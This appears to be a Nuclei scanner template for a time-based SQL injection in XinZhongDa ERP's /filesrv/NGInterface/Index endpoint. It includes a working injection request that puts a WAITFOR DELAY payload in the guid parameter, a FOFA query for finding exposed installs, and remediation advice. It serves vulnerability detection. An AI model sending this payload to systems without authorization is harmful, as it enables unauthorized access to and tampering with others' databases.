id: xinzhongda-erp-nginterface-sqli

info:
  name: XinZhongDa ERP /filesrv/NGInterface/Index - SQL Injection (Time-based)
  author: qwtd
  severity: high
  description: |
    XinZhongDa ERP exposes a SQL injection vulnerability in /filesrv/NGInterface/Index.
    When type=getfilelist, the guid parameter can be injected with SQL Server time-based payloads (e.g., WAITFOR DELAY),
    allowing attackers to infer database behavior and potentially extract or tamper with sensitive data.
  remediation: |
    - Apply the vendor patch/upgrade to a fixed version as soon as possible.
    - Use parameterized queries (prepared statements) for guid and other user-controlled parameters.
    - Enforce strict input validation (GUID format allow-list) and reject quotes/SQL keywords.
    - Restrict external access to /filesrv/NGInterface/* endpoints (internal network only) and add WAF rules for SQLi.
    - Monitor logs for repeated time-delay probes and block offending sources.
  impact: |
    Successful exploitation may lead to unauthorized database access (data disclosure/modification).
    Time-based SQLi can also be abused to degrade service availability by forcing database delays.
  reference:
    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E6%96%B0%E4%B8%AD%E5%A4%A7ERP%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/%E6%96%B0%E4%B8%AD%E5%A4%A7ERP%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20NGInterface%20%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
  classification:
    cwe-id: CWE-89
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  metadata:
    vendor: xinzhongda
    product: xinzhongda-erp
    verified: false
    max-request: 1
    fofa-query: body="Resource/pic/product_btn.png" || body="/login/SSOValidation.html"
  tags: 新中大ERP企业管理软件

http:
  - method: POST
    raw:
      - |
        POST /filesrv/NGInterface/Index HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        type=getfilelist&guid=';WAITFOR DELAY'0:0:3'--
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 3"
      - type: status
        status:
          - 200
      - type: word
        words:
          - "[]"
